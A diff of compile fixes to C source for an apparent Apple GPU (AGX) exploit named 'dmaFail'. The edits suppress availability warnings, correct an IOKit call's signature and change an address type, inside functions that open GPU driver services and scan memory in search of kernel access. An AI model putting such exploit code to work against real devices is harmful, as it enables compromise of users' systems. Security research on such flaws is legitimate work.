@@ -194,8 +194,11 @@ static int dma_open_agx(void) {
 
     io_service_t svc = MACH_PORT_NULL;
     for (int i = 0; svc_names[i]; i++) {
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wunguarded-availability-new"
         svc = IOServiceGetMatchingService(
             kIOMainPortDefault, IOServiceMatching(svc_names[i]));
+#pragma clang diagnostic pop
         if (svc != MACH_PORT_NULL) {
             LOG("[dmaFail] 找到服务: %s", svc_names[i]);
             break;
@@ -205,8 +208,11 @@ static int dma_open_agx(void) {
     if (svc == MACH_PORT_NULL) {
         // 备用: 通过 IORegistry 遍历
         io_iterator_t iter;
+#pragma clang diagnostic push
+#pragma clang diagnostic ignored "-Wunguarded-availability-new"
         if (IOServiceGetMatchingServices(kIOMainPortDefault,
                 IOServiceMatching("IOAccelerator"), &iter) == KERN_SUCCESS) {
+#pragma clang diagnostic pop
             svc = IOIteratorNext(iter);
             if (svc) LOG("[dmaFail] 通过迭代找到 IOAccelerator");
             IOObjectRelease(iter);
@@ -268,7 +274,8 @@ static int dma_open_shared(void) {
 
     // 尝试用 IOServiceOpen 直接打开 shared client
     // 或者通过 IOConnectGetService 获取子服务
-    io_service_t shared_svc = IOConnectGetService(g_dc.agx_conn);
+    io_service_t shared_svc = MACH_PORT_NULL;
+    IOConnectGetService(g_dc.agx_conn, &shared_svc);
     if (shared_svc) {
         // 查找子服务
         io_iterator_t iter;
@@ -543,7 +550,7 @@ static int dmafail_exploit(void) {
     LOG("[dmaFail] 尝试用户态内存扫描...");
 
     task_t self = mach_task_self();
-    vm_address_t scan_base = 0;
+    mach_vm_address_t scan_base = 0;
     vm_size_t scan_size = KERNEL_SCAN_RANGE;
     vm_prot_t cur = VM_PROT_READ | VM_PROT_WRITE;
     vm_prot_t max = VM_PROT_READ | VM_PROT_WRITE;
